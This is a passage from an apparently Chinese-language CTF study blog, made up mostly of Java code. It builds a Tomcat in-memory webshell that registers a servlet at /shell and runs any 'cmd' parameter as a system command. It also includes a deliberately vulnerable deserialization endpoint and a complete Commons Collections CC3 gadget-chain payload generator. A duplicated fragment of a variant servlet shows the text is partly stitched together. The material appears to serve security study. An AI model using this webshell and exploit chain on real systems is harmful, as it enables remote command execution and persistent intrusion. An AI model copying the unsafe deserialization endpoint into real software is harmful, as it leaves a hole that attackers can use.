class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.echoshell.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shellcode</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 去掉final修饰符，设置访问权限</span></span><br><span class="line">            modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            WRAP_SAME_OBJECT.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 修改 WRAP_SAME_OBJECT 并且初始化 lastServicedRequest 和 lastServicedResponse</span></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT.getBoolean(<span class="literal">null</span>)) &#123;</span><br><span class="line">                WRAP_SAME_OBJECT.setBoolean(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;ServletRequest&gt;());</span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;ServletResponse&gt;());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">                <span class="comment">//从req中获取ServletContext对象</span></span><br><span class="line">                <span class="comment">// 第二次请求后进入 else 代码块，获取 Request 和 Response 对象，写入回显</span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; threadLocalReq = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);</span><br><span class="line">                ThreadLocal&lt;ServletResponse&gt; threadLocalResp = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponse.get(<span class="literal">null</span>);</span><br><span class="line">                <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> threadLocalReq.get();</span><br><span class="line">                <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> threadLocalResp.get();</span><br><span class="line"></span><br><span class="line">                <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (servletContext.getServletRegistration(name) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">StandardContext</span> <span class="variable">o</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象</span></span><br><span class="line">                    <span class="keyword">while</span> (o == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> f.get(servletContext);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (object <span class="keyword">instanceof</span> ServletContext) &#123;</span><br><span class="line">                            servletContext = (ServletContext) object;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (object <span class="keyword">instanceof</span> StandardContext) &#123;</span><br><span class="line">                            o = (StandardContext) object;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//自定义servlet</span></span><br><span class="line">                    <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">shellcode</span>();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//用Wrapper封装servlet</span></span><br><span class="line">                    <span class="type">Wrapper</span> <span class="variable">newWrapper</span> <span class="operator">=</span> o.createWrapper();</span><br><span class="line">                    newWrapper.setName(name);</span><br><span class="line">                    newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">                    newWrapper.setServlet(servlet);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//向children中添加Wrapper</span></span><br><span class="line">                    o.addChild(newWrapper);</span><br><span class="line">                    <span class="comment">//添加servlet的映射</span></span><br><span class="line">                    o.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">                            o = (StandardContext) object;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//自定义servlet</span></span><br><span class="line">                    <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException, IOException &#123;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                                isLinux = <span class="literal">false</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                            out.println(output);</span><br><span class="line">                            out.flush();</span><br><span class="line">                            out.close();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//用Wrapper封装servlet</span></span><br><span class="line">                    <span class="type">Wrapper</span> <span class="variable">newWrapper</span> <span class="operator">=</span> o.createWrapper();</span><br><span class="line">                    newWrapper.setName(name);</span><br><span class="line">                    newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">                    newWrapper.setServlet(servlet);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//向children中添加Wrapper</span></span><br><span class="line">                    o.addChild(newWrapper);</span><br><span class="line">                    <span class="comment">//添加servlet的映射</span></span><br><span class="line">                    o.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后我们自定义一个反序列化入口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.echoshell.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellPoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/unserial&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">(HttpServletRequest req)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;in&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] data = Base64.getDecoder().decode(req.getParameter(<span class="string">&quot;data&quot;</span>));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(objectInputStream.readObject());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后通过CC3打进：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.echoshell.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class c= TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;Boogipop&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CTF学习笔记\\Java\\echoshell\\target\\classes\\com\\example\\echoshell\\controller\\shellcode.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        <span class="comment">//由于还没进行反序列化，所以手动给_tfactory赋值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//CC1后半</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//随便改成什么Transformer</span></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        String res=encryptToBase64(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encryptToBase64</span><span class="params">(String filePath)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (filePath == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] b = Files.readAllBytes(Paths.get(filePath));</span><br><span class="line">            <span class="keyword">return</span> Base64.getEncoder().encodeToString(b);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
